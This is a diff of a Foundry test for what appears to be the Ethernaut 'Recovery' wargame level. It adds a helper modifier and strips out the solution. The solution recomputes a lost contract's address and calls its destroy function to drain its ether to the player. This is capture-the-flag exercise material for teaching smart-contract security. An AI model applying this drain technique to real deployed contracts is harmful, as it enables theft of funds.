@@ -20,6 +20,12 @@ contract TestRecovery is Test, Utils {
                                  HELPERS
     //////////////////////////////////////////////////////////////*/
 
+    modifier checkSolvedByPlayer() {
+        vm.startPrank(player, player);
+        _;
+        assertTrue(submitLevelInstance(ethernaut, address(instance)));
+    }
+
     function setUp() public {
         address payable[] memory users = createUsers(2);
 
@@ -51,19 +57,7 @@ contract TestRecovery is Test, Utils {
     }
 
     /// @notice Test the solution for the level.
-    function testSolve() public {
-        vm.startPrank(player, player);
+    function testSolve() public checkSolvedByPlayer{
 
-        address payable lostContract = payable(
-            address(
-                uint160(
-                    uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(instance), bytes1(0x01))))
-                )
-            )
-        );
-
-        SimpleToken(lostContract).destroy(player);
-
-        assertTrue(submitLevelInstance(ethernaut, address(instance)));
     }
 }
